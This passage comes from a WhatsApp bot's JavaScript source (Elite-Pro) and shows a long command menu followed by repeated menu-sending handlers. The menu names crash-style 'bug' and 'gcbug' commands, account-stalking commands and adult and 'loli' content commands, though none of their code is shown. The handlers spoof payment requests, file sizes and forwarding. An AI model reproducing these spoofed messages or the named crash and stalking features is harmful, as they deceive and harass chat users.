*││◦➛* ${prefix}imdb
*││◦➛* ${prefix}img
*││◦➛* ${prefix}imgsearch
*││◦➛* ${prefix}img1
*││◦➛* ${prefix}wanumber
*││◦➛* ${prefix}friend
*││◦➛* ${prefix}lyrics
*╰═════════════❍*

*╭────❍* Download Menu *❍*
*││◦➛* ${prefix}xnxxdl
*││◦➛* ${prefix}xvideodl
*││◦➛* ${prefix}itunes
*││◦➛* ${prefix}play
*││◦➛* ${prefix}song
*││◦➛* ${prefix}aio
*││◦➛* ${prefix}ytmp3
*││◦➛* ${prefix}ytmp4
*││◦➛* ${prefix}tiktok
*││◦➛* ${prefix}instagram 
*││◦➛* ${prefix}tiktokaudio
*││◦➛* ${prefix}tiktokvideo
*││◦➛* ${prefix}tiktokslide
*││◦➛* ${prefix}igvideo
*││◦➛* ${prefix}igimage
*││◦➛* ${prefix}facebook
*││◦➛* ${prefix}video
*││◦➛* ${prefix}twitter
*││◦➛* ${prefix}capcut
*││◦➛* ${prefix}apk
*││◦➛* ${prefix}mega
*││◦➛* ${prefix}mediafire
*││◦➛* ${prefix}google
*││◦➛* ${prefix}gimage
*││◦➛* ${prefix}weather
*││◦➛* ${prefix}spotify
*││◦➛* ${prefix}gitclone
*││◦➛* ${prefix}happymod
*││◦➛* ${prefix}gdrive
*││◦➛* ${prefix}pinterest
*││◦➛* ${prefix}ringtone
*││◦➛* ${prefix}autodownload
*╰═════════════❍*

*╭────❍* Convert *❍*
*││◦➛* ${prefix}shorturl
*││◦➛* ${prefix}obfuscate
*││◦➛* ${prefix}styletext
*││◦➛* ${prefix}fliptext
*││◦➛* ${prefix}tts
*││◦➛* ${prefix}say
*││◦➛* ${prefix}imgpng
*││◦➛* ${prefix}togif
*││◦➛* ${prefix}toqr
*││◦➛* ${prefix}bass
*││◦➛* ${prefix}blown
*││◦➛* ${prefix}deep
*││◦➛* ${prefix}earrape
*││◦➛* ${prefix}fast
*││◦➛* ${prefix}fat
*││◦➛* ${prefix}nightcore
*││◦➛* ${prefix}reverse
*││◦➛* ${prefix}robot
*││◦➛* ${prefix}slow
*││◦➛* ${prefix}smooth
*││◦➛* ${prefix}squirrel
*││◦➛* ${prefix}tinyurl
*││◦➛* ${prefix}tovn
*││◦➛* ${prefix}toaudio
*││◦➛* ${prefix}tomp3
*││◦➛* ${prefix}tomp4
*││◦➛* ${prefix}toimg
*││◦➛* ${prefix}toonce
*││◦➛* ${prefix}sticker
*││◦➛* ${prefix}smeme
*││◦➛* ${prefix}smeta
*││◦➛* ${prefix}take
*││◦➛* ${prefix}emoji
*││◦➛* ${prefix}volaudio
*││◦➛* ${prefix}volvideo
*││◦➛* ${prefix}ebinary
*││◦➛* ${prefix}dbinary
*││◦➛* ${prefix}ssweb
*││◦➛* ${prefix}quoted
*││◦➛* ${prefix}translate
*╰═════════════❍*

*╭────❍* List *❍*
*││◦➛* ${prefix}listprem
*││◦➛* ${prefix}listowner
*││◦➛* ${prefix}liststicker
*││◦➛* ${prefix}listimage
*││◦➛* ${prefix}listvideo
*││◦➛* ${prefix}listvn
*││◦➛* ${prefix}listapk
*││◦➛* ${prefix}listzip
*││◦➛* ${prefix}listpdf
*││◦➛* ${prefix}listbadword
*││◦➛* ${prefix}listpc
*││◦➛* ${prefix}listgc
*╰═════════════❍*

*╭────❍* Random Photo *❍*
*││◦➛* ${prefix}aesthetic
*││◦➛* ${prefix}coffee
*││◦➛* ${prefix}wikimedia
*││◦➛* ${prefix}wallpaper
*││◦➛* ${prefix}art
*││◦➛* ${prefix}bts
*││◦➛* ${prefix}dogwoof
*││◦➛* ${prefix}catmeow
*││◦➛* ${prefix}lizardpic
*││◦➛* ${prefix}goosebird
*││◦➛* ${prefix}8ballpool
*││◦➛* ${prefix}cosplay
*││◦➛* ${prefix}hacker
*││◦➛* ${prefix}cyber
*││◦➛* ${prefix}gamewallpaper
*││◦➛* ${prefix}islamic
*││◦➛* ${prefix}jennie
*││◦➛* ${prefix}jiso
*││◦➛* ${prefix}satanic
*││◦➛* ${prefix}justina
*││◦➛* ${prefix}cartoon
*││◦➛* ${prefix}pentol
*││◦➛* ${prefix}cat
*││◦➛* ${prefix}kpop
*││◦➛* ${prefix}exo
*││◦➛* ${prefix}lisa
*││◦➛* ${prefix}space
*││◦➛* ${prefix}car
*││◦➛* ${prefix}technology
*││◦➛* ${prefix}bike
*││◦➛* ${prefix}shortquote
*││◦➛* ${prefix}antiwork
*││◦➛* ${prefix}hacking
*││◦➛* ${prefix}boneka
*││◦➛* ${prefix}rose
*││◦➛* ${prefix}ryujin
*││◦➛* ${prefix}ulzzangboy
*││◦➛* ${prefix}ulzzanggirl
*││◦➛* ${prefix}wallml
*││◦➛* ${prefix}wallphone
*││◦➛* ${prefix}mountain
*││◦➛* ${prefix}goose
*││◦➛* ${prefix}profilepic
*││◦➛* ${prefix}couplepp
*││◦➛* ${prefix}programming
*││◦➛* ${prefix}pubg
*││◦➛* ${prefix}blackpink
*││◦➛* ${prefix}randomboy  
*││◦➛* ${prefix}randomgirl
*││◦➛* ${prefix}hijab  
*││◦➛* ${prefix}chinese
*││◦➛* ${prefix}indo
*││◦➛* ${prefix}japanese
*││◦➛* ${prefix}korean
*││◦➛* ${prefix}malay
*││◦➛* ${prefix}thai
*││◦➛* ${prefix}vietnamese
*╰═════════════❍*

*╭────❍* Random Video *❍*
*││◦➛* ${prefix}tiktokgirl
*││◦➛* ${prefix}tiktoknukthy
*││◦➛* ${prefix}tiktokkayes
*││◦➛* ${prefix}tiktokpanrika
*││◦➛* ${prefix}tiktoknotnot
*││◦➛* ${prefix}tiktokghea
*││◦➛* ${prefix}tiktoksantuy
*││◦➛* ${prefix}tiktokbocil
*╰═════════════❍*

*╭────❍* Stalker *❍*
*││◦➛* ${prefix}tiktokstalk
*││◦➛* ${prefix}mlstalk
*││◦➛* ${prefix}npmstalk
*││◦➛* ${prefix}ghstalk
*╰═════════════❍*

*╭────❍* OpenAI *❍*
*││◦➛* ${prefix}openai-indo
*││◦➛* ${prefix}indo-ai
*││◦➛* ${prefix}diffusion
*││◦➛* ${prefix}photoleap
*││◦➛* ${prefix}chatgpt
*││◦➛* ${prefix}dalle
*││◦➛* ${prefix}ai
*││◦➛* ${prefix}flux
*││◦➛* ${prefix}remini
*││◦➛* ${prefix}simi
*││◦➛* ${prefix}removebg
*││◦➛* ${prefix}tozombie
*╰═════════════❍*

*╭────❍* Game *❍*
*││◦➛* ${prefix}truth
*││◦➛* ${prefix}truth1
*││◦➛* ${prefix}dare
*││◦➛* ${prefix}suit
*││◦➛* ${prefix}tictactoe
*││◦➛* ${prefix}math
*╰═════════════❍*

*╭────❍* Fun Menu *❍*
*││◦➛* ${prefix}define
*││◦➛* ${prefix}readmore
*││◦➛* ${prefix}fact
*││◦➛* ${prefix}couple
*││◦➛* ${prefix}soulmate
*││◦➛* ${prefix}stupidcheck
*││◦➛* ${prefix}handsomecheck
*││◦➛* ${prefix}uncleancheck
*││◦➛* ${prefix}hotcheck
*││◦➛* ${prefix}smartcheck
*││◦➛* ${prefix}greatcheck
*││◦➛* ${prefix}evilcheck
*││◦➛* ${prefix}dogcheck
*││◦➛* ${prefix}coolcheck
*││◦➛* ${prefix}waifucheck
*││◦➛* ${prefix}awesomecheck
*││◦➛* ${prefix}gaycheck
*││◦➛* ${prefix}cutecheck
*││◦➛* ${prefix}lesbiancheck
*││◦➛* ${prefix}hornycheck
*││◦➛* ${prefix}prettycheck
*││◦➛* ${prefix}lovelycheck
*││◦➛* ${prefix}uglycheck
*││◦➛* ${prefix}pick
*││◦➛* ${prefix}pickupline
*││◦➛* ${prefix}quotes
*││◦➛* ${prefix}can
*││◦➛* ${prefix}is
*││◦➛* ${prefix}when
*││◦➛* ${prefix}where
*││◦➛* ${prefix}what
*││◦➛* ${prefix}how
*││◦➛* ${prefix}rate
*││◦➛* ${prefix}cry
*││◦➛* ${prefix}kill
*││◦➛* ${prefix}hug
*││◦➛* ${prefix}pat
*││◦➛* ${prefix}lick 
*││◦➛* ${prefix}kiss
*││◦➛* ${prefix}bite
*││◦➛* ${prefix}yeet
*││◦➛* ${prefix}bully
*││◦➛* ${prefix}bonk
*││◦➛* ${prefix}wink
*││◦➛* ${prefix}poke
*││◦➛* ${prefix}nom
*││◦➛* ${prefix}slap
*││◦➛* ${prefix}smile 
*││◦➛* ${prefix}wave
*││◦➛* ${prefix}awoo
*││◦➛* ${prefix}blush
*││◦➛* ${prefix}smug
*││◦➛* ${prefix}glomp 
*││◦➛* ${prefix}happy
*││◦➛* ${prefix}dance
*││◦➛* ${prefix}cringe
*││◦➛* ${prefix}cuddle
*││◦➛* ${prefix}highfive 
*││◦➛* ${prefix}handhold
*││◦➛* ${prefix}spank
*││◦➛* ${prefix}tickle
*││◦➛* ${prefix}feed
*││◦➛* ${prefix}checkme
*││◦➛* ${prefix}sound1 - sound161
*╰═════════════❍*

*╭────❍* Sticker *❍*
*││◦➛* ${prefix}goose
*││◦➛* ${prefix}woof
*││◦➛* ${prefix}8ball
*││◦➛* ${prefix}lizard
*││◦➛* ${prefix}meow
*││◦➛* ${prefix}gura
*││◦➛* ${prefix}telestick
*││◦➛* ${prefix}ttp
*╰═════════════❍*

*╭────❍* Anime *❍*
*││◦➛* ${prefix}stickhandhold
*││◦➛* ${prefix}stickshinobu
*││◦➛* ${prefix}stickcuddle
*││◦➛* ${prefix}stickhighfive
*││◦➛* ${prefix}stickdance
*││◦➛* ${prefix}stickcringe
*││◦➛* ${prefix}stickhappy
*││◦➛* ${prefix}stickglomp
*││◦➛* ${prefix}sticksmug
*││◦➛* ${prefix}stickblush
*││◦➛* ${prefix}stickawoo
*││◦➛* ${prefix}stickwave
*││◦➛* ${prefix}sticksmile
*││◦➛* ${prefix}stickslap
*││◦➛* ${prefix}stickpoke
*││◦➛* ${prefix}stickwink
*││◦➛* ${prefix}stickbonk
*││◦➛* ${prefix}stickbully
*││◦➛* ${prefix}stickyeet
*││◦➛* ${prefix}stickbike
*││◦➛* ${prefix}stickkiss
*││◦➛* ${prefix}sticklick
*││◦➛* ${prefix}stickpat
*││◦➛* ${prefix}stickhug
*││◦➛* ${prefix}stickkill
*││◦➛* ${prefix}stickcry
*││◦➛* ${prefix}stickspank
*││◦➛* ${prefix}sticktickle
*││◦➛* ${prefix}traceanime
*││◦➛* ${prefix}akira
*││◦➛* ${prefix}akiyama
*││◦➛* ${prefix}ana
*││◦➛* ${prefix}asuna
*││◦➛* ${prefix}ayuzawa
*││◦➛* ${prefix}boruto
*││◦➛* ${prefix}chiho
*││◦➛* ${prefix}chitoge
*││◦➛* ${prefix}cosplayloli
*││◦➛* ${prefix}cosplaysagiri
*││◦➛* ${prefix}deidara
*││◦➛* ${prefix}doraemon
*││◦➛* ${prefix}elaina
*││◦➛* ${prefix}emilia
*││◦➛* ${prefix}erza
*││◦➛* ${prefix}gremory
*││◦➛* ${prefix}hestia
*││◦➛* ${prefix}husbu
*││◦➛* ${prefix}inori
*││◦➛* ${prefix}isuzu
*││◦➛* ${prefix}itachi
*││◦➛* ${prefix}itori
*││◦➛* ${prefix}kaga
*││◦➛* ${prefix}kagura
*││◦➛* ${prefix}kakasih
*││◦➛* ${prefix}kaori
*││◦➛* ${prefix}keneki
*││◦➛* ${prefix}kotori
*││◦➛* ${prefix}kurumi
*││◦➛* ${prefix}loli
*││◦➛* ${prefix}loli2
*││◦➛* ${prefix}madara
*││◦➛* ${prefix}megumin
*││◦➛* ${prefix}mikasa
*││◦➛* ${prefix}mikey
*││◦➛* ${prefix}miku
*││◦➛* ${prefix}minato
*││◦➛* ${prefix}naruto
*││◦➛* ${prefix}neko
*││◦➛* ${prefix}nekonime
*││◦➛* ${prefix}nezuko
*││◦➛* ${prefix}onepiece
*││◦➛* ${prefix}pokemon
*││◦➛* ${prefix}randomnime
*││◦➛* ${prefix}randomnime2
*││◦➛* ${prefix}rize
*││◦➛* ${prefix}sagiri
*││◦➛* ${prefix}sakura
*││◦➛* ${prefix}sasuke
*││◦➛* ${prefix}shina
*││◦➛* ${prefix}shinka
*││◦➛* ${prefix}shinomiya
*││◦➛* ${prefix}shizuka
*││◦➛* ${prefix}shota
*││◦➛* ${prefix}tejina
*││◦➛* ${prefix}toukachan
*││◦➛* ${prefix}tsunade
*││◦➛* ${prefix}waifu
*││◦➛* ${prefix}waifu2
*││◦➛* ${prefix}animewall
*││◦➛* ${prefix}yotsuba
*││◦➛* ${prefix}yuki
*││◦➛* ${prefix}yulibocil
*││◦➛* ${prefix}yumeko
*││◦➛* ${prefix}8ball
*││◦➛* ${prefix}animeawoo
*││◦➛* ${prefix}animemegumin
*││◦➛* ${prefix}animeshinobu
*││◦➛* ${prefix}animehandhold
*││◦➛* ${prefix}animehighfive
*││◦➛* ${prefix}animecringe
*││◦➛* ${prefix}animedance
*││◦➛* ${prefix}animehappy
*││◦➛* ${prefix}animeglomp
*││◦➛* ${prefix}animeblush
*││◦➛* ${prefix}animesmug
*││◦➛* ${prefix}animewave
*││◦➛* ${prefix}animesmille
*││◦➛* ${prefix}animepoke
*││◦➛* ${prefix}animewink
*││◦➛* ${prefix}animebonk
*││◦➛* ${prefix}animebully
*││◦➛* ${prefix}animeyeet
*││◦➛* ${prefix}animebite
*││◦➛* ${prefix}animelick
*││◦➛* ${prefix}animekill
*││◦➛* ${prefix}animecry
*││◦➛* ${prefix}animewlp
*││◦➛* ${prefix}animekiss
*││◦➛* ${prefix}animehug
*││◦➛* ${prefix}animeneko
*││◦➛* ${prefix}animepat
*││◦➛* ${prefix}animeslap
*││◦➛* ${prefix}animecuddle
*││◦➛* ${prefix}animewaifu
*││◦➛* ${prefix}animenom
*││◦➛* ${prefix}animefoxgirl
*││◦➛* ${prefix}animegecg
*││◦➛* ${prefix}animetickle
*││◦➛* ${prefix}animefeed
*││◦➛* ${prefix}animeavatar
*││◦➛* ${prefix}anime
*││◦➛* ${prefix}avatar
*││◦➛* ${prefix}shinobu
*││◦➛* ${prefix}fox_girl
*││◦➛* ${prefix}gecg
*╰═════════════❍*

*╭────❍* Anime NSFW *❍*
*││◦➛* ${prefix}hentai
*││◦➛* ${prefix}gifblowjob
*││◦➛* ${prefix}hentaivid
*││◦➛* ${prefix}hneko
*││◦➛* ${prefix}nwaifu
*││◦➛* ${prefix}animespank
*││◦➛* ${prefix}trap
*││◦➛* ${prefix}blowjob
*││◦➛* ${prefix}cuckold
*││◦➛* ${prefix}milf
*││◦➛* ${prefix}eba
*││◦➛* ${prefix}pussy
*││◦➛* ${prefix}yuri
*││◦➛* ${prefix}zettai
*╰═════════════❍*

*╭────❍* PhotoOxy Maker *❍*
*││◦➛* ${prefix}shadow 
*││◦➛* ${prefix}write 
*││◦➛* ${prefix}romantic 
*││◦➛* ${prefix}burnpaper
*││◦➛* ${prefix}smoke 
*││◦➛* ${prefix}narutobanner 
*││◦➛* ${prefix}love 
*││◦➛* ${prefix}undergrass
*││◦➛* ${prefix}doublelove 
*││◦➛* ${prefix}coffecup
*││◦➛* ${prefix}underwaterocean
*││◦➛* ${prefix}smokyneon
*││◦➛* ${prefix}starstext
*││◦➛* ${prefix}rainboweffect
*││◦➛* ${prefix}balloontext
*││◦➛* ${prefix}metalliceffect
*││◦➛* ${prefix}embroiderytext
*││◦➛* ${prefix}flamingtext
*││◦➛* ${prefix}stonetext
*││◦➛* ${prefix}writeart
*││◦➛* ${prefix}summertext
*││◦➛* ${prefix}wolfmetaltext
*││◦➛* ${prefix}nature3dtext
*││◦➛* ${prefix}rosestext
*││◦➛* ${prefix}naturetypography
*││◦➛* ${prefix}quotesunder
*││◦➛* ${prefix}shinetext
*╰═════════════❍*

*╭────❍* Database *❍*
*││◦➛* ${prefix}setcmd
*││◦➛* ${prefix}delcmd
*││◦➛* ${prefix}listcmd
*││◦➛* ${prefix}lockcmd
*││◦➛* ${prefix}addmsg
*││◦➛* ${prefix}delmsg
*││◦➛* ${prefix}getmsg
*││◦➛* ${prefix}listmsg
*╰═════════════❍*

*╭────❍* Store *❍*
*││◦➛* ${prefix}list
*││◦➛* ${prefix}store
*││◦➛* ${prefix}shop
*││◦➛* ${prefix}addlist
*││◦➛* ${prefix}dellist
*╰═════════════❍*

*╭────❍* Religon *❍*
*││◦➛* ${prefix}bible
*││◦➛* ${prefix}quran
*││◦➛* ${prefix}gita
*╰═════════════❍*

*╭────❍* Bug Menu *❍*
*││◦➛* ${prefix}bug
*││◦➛* ${prefix}gcbug
*╰═════════════❍*

*╭────❍* Other Menu *❍*
*││◦➛* ${prefix}ping
*││◦➛* ${prefix}alive
*││◦➛* ${prefix}menu
*││◦➛* ${prefix}myip
*││◦➛* ${prefix}repo
*││◦➛* ${prefix}reportbug
*││◦➛* ${prefix}idgroup
*││◦➛* ${prefix}owner
*││◦➛* ${prefix}rentbot
*││◦➛* ${prefix}donate
*││◦➛* ${prefix}runtime
*││◦➛* ${prefix}uptime
*││◦➛* ${prefix}checkaccount
*╰═════════════❍*
> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴇʟɪᴛᴇ-ᴘʀᴏ©*`
if (typemenu === 'v1') {
  const axios = require('axios'); // Import axios inside the block
  
  const images = [
    "https://i.ibb.co/JWBYb1nF/elitepro.jpg",
    "https://i.ibb.co/CNFGVhK/20250204-154801.jpg",
    "https://i.ibb.co/fdWbdbFm/20250216-153528.jpg",
    "https://i.ibb.co/xKSmsDG2/20250207-133529.jpg",
    "https://i.ibb.co/BVfhtnP7/0d641affa3bc40d54a2e260b2096a2f3.jpg",
    "https://i.ibb.co/Y4yMQnbN/3799d3f114e3a3c2209051d1af5ab9e8.jpg",
    "https://i.ibb.co/Y4Q1svn9/985dcc4c387f362bed2a97addd618c2c.jpg",
    "https://i.ibb.co/q33F4m9N/def58cefbb19e51ffa60adb9279b0bed.jpg",
    "https://i.ibb.co/Wv3s7ygD/174a96d25be046da7b4571e439e8ba87.jpg",
    "https://i.ibb.co/HDFbNxTL/f8998b0b2ea04904e8e86a7035302d2f.jpg",
    "https://i.ibb.co/v83nqmx/f1c2e4ad310f52bb94a6e3c7eaa07ff0.jpg",
    "https://i.ibb.co/nHHybkt/6ac87425597ad883ae48b941018237de.jpg",
    "https://i.ibb.co/DHnhV9PH/4680c21a8f66d3719a3c322c7bc43e83.jpg",
    elitepropp
  ];
  
  const emojis = ['👨‍💻', '🔥', '🧘', '💎', '🎉', '😎', '✅', '🌟', '⚡', '🛠️', '💡'];
  const randomImage = images[Math.floor(Math.random() * images.length)];
  const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
  
  // Fetch random audio from the API
  axios.get('https://raw.githubusercontent.com/Cyrilix-XMD/cyrilix-store/refs/heads/main/music-url.json')
    .then(response => {
      const audioList = response.data;
      if (!Array.isArray(audioList) || audioList.length === 0) {
        console.error("Invalid audio list from API");
        return;
      }
      const randomAudio = audioList[Math.floor(Math.random() * audioList.length)];
      
      // Send reaction first
      EliteProEmpire.sendMessage(m.chat, {
        react: { text: randomEmoji, key: m.key }
      });
      
      // Send image with caption and forwarded effect
      EliteProEmpire.sendMessage(m.chat, {
        image: { url: randomImage },
        caption: `${xmenu_oh} ${randomEmoji}`,
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterName: "ELITE-PRO-V2",
            newsletterJid: "120363287352245413@newsletter",
          }
        }
      }, { quoted: m }).then(() => {
        // Send audio after the image message
        EliteProEmpire.sendMessage(m.chat, {
          audio: { url: randomAudio },
          mimetype: "audio/mp4",
          ptt: true // Set to true if you want it as a voice note
        }, { quoted: m });
      });
      
    })
    .catch(error => {
      console.error("Error fetching audio from API:", error);
    });
} else if (typemenu === 'v2') {
                    EliteProEmpire.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    EliteProEmpire.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    EliteProEmpire.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    EliteProEmpire.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	EliteProEmpire.sendMessage(m.chat, {
      video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/svNLtkqf/20250128-021109.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }}, {
                        quoted: m
                    })
      } else if (typemenu === 'v9') {
                	EliteProEmpire.sendMessage(m.chat, {
video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363287352245413@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/svNLtkqf/20250128-021109.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} 
}
break
            case 'tutorialmenu': {
let xmenu_oh = `Hi user ${pushname}\n${tutorials(prefix, hituet)}`
if (typemenu === 'v1') {
                    EliteProEmpire.sendMessage(m.chat, {
                        image: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    EliteProEmpire.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    EliteProEmpire.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    EliteProEmpire.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    EliteProEmpire.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	EliteProEmpire.sendMessage(m.chat, {
      video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/svNLtkqf/20250128-021109.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	EliteProEmpire.sendMessage(m.chat, {
video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363287352245413@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/svNLtkqf/20250128-021109.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} 
}
break
            case 'ownermenu': {
let xmenu_oh = `Hi user ${pushname}\n${ownermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    EliteProEmpire.sendMessage(m.chat, {
                        image: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    EliteProEmpire.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    EliteProEmpire.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    EliteProEmpire.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    EliteProEmpire.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	EliteProEmpire.sendMessage(m.chat, {
      video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/svNLtkqf/20250128-021109.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	EliteProEmpire.sendMessage(m.chat, {
video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363287352245413@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
